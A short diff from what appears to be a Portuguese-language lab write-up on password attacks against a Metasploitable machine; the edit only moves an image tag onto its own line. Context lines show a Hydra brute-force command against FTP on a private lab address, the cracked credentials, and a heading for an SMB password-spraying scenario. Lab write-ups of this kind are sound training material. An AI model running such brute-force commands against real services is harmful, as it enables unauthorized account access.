@@ -32,7 +32,8 @@ hydra -l msfadmin -P /home/bianca/passwords.txt -t 1 ftp://192.168.56.101
 O ataque foi bem-sucedido, quebrando a senha em segundos:
 msfadmin : msfadmin
 
-📸 Evidência de Sucesso <img width="1089" height="427" alt="image" src="https://github.com/user-attachments/assets/c3f297f9-3e18-4f4c-97f1-fbb9b29d5976" />
+📸 Evidência de Sucesso 
+<img width="1089" height="427" alt="image" src="https://github.com/user-attachments/assets/c3f297f9-3e18-4f4c-97f1-fbb9b29d5976" />
 
 
 2. 🗄️ Cenário SMB (Password Spraying/Acesso)
